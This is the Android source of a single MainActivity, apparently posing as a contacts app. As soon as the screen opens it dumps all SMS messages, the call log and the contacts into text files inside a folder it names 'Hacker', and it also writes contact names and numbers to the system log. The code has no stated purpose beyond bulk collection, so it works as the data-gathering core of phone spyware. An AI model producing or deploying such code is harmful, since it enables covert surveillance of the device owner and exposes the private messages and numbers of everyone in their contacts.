package com.hello.contacts;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;

import static android.content.ContentValues.TAG;

public class MainActivity extends AppCompatActivity {
    TextView textView;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        textView=findViewById(R.id.text);
    }

    @Override
    protected void onStart() {
        super.onStart();
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)!= PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},0);
        }else {
            File file = new File(getExternalFilesDir(null) +"/Hacker");
            if (!file.exists()) {
                file.mkdir();
                textView.setText(file.toString());
                Toast.makeText(this, "FileCreated", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "File already exists" + file, Toast.LENGTH_SHORT).show();
            }
            gettingcontacts();
            getcalllog();
            getsms();
        }

    }


    private void getsms() {
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)!= PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_SMS},0);
        }
       try {
            File SmsFile=new File(getExternalFilesDir(null)+"/Hacker");

            File smswriter=new File(SmsFile,"Sms.txt");
            FileWriter smsw=new FileWriter(smswriter);
            Cursor cursor=getContentResolver().query(Uri.parse("content://sms"),null,null,null,null);
            if(cursor.getCount()>0) {
                while (cursor.moveToNext()) {

                    String Number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String Message = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String Date1 = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    smsw.append("Number : " + Number + "\r\n" + "Message : " + Message + "\r\n" + "Date : " + Date1 + "\r\n");
                    smsw.flush();
                }
            }
            smsw.close();



            } catch (IOException e) {
                e.printStackTrace();
            }
    }

    private void getcalllog() {
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)!= PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CALL_LOG},0);
        }
        try {
            File file=new File(getExternalFilesDir(null)+"/Hacker");

            File CallLogs=new File(file,"CallLogs.txt");
            FileWriter callwriter=new FileWriter(CallLogs);
            ContentResolver contentResolver=getContentResolver();
            Uri Call= CallLog.Calls.CONTENT_URI;
            Cursor cursorcallalogs=contentResolver.query(Call,null,null,null,null);
            if(cursorcallalogs.getCount() >0) {
                while(cursorcallalogs.moveToNext()){
                    @SuppressLint("Range") String Name=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    @SuppressLint("Range") String Number=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.NUMBER));
                    @SuppressLint("Range") String Duration=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.DURATION));
                    callwriter.append("Cached_Name : "+Name+"\r\n"+"Number : "+Number+"\r\n"+"Duration : "+Duration+"\r\n");
                    callwriter.flush();
                }
            }
            callwriter.close();

        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void gettingcontacts(){
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CONTACTS},0);
        }
        try {
        File file=new File(getExternalFilesDir(null)+"/Hacker");

        File Contacts=new File(file,"Contacts.txt");

            FileWriter writer=new FileWriter(Contacts);

        ContentResolver contentResolver=getContentResolver();
        Uri uri= ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        Cursor cursor=contentResolver.query(uri,null,null,null,null);
        Log.w("Contact Provider Demo", "Total # No of Contacts ::: " +Integer.toString(cursor.getCount()));
        if(cursor.getCount()>0){
            while (cursor.moveToNext()){
                @SuppressLint("Range") String contactname= cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                @SuppressLint("Range") String phoneNumber= cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                textView.setText("Contact Name : "+contactname+" Ph : "+phoneNumber);
                writer.append("Contact Name : "+contactname+" Ph : "+phoneNumber+"\r\n");
                writer.flush();
                Log.i("Content Provider","Contact Name ::: "+contactname+" Ph # "+phoneNumber);
            }
            writer.close();
        }
        }
         catch (IOException e) {
            e.printStackTrace();
        }
    }
}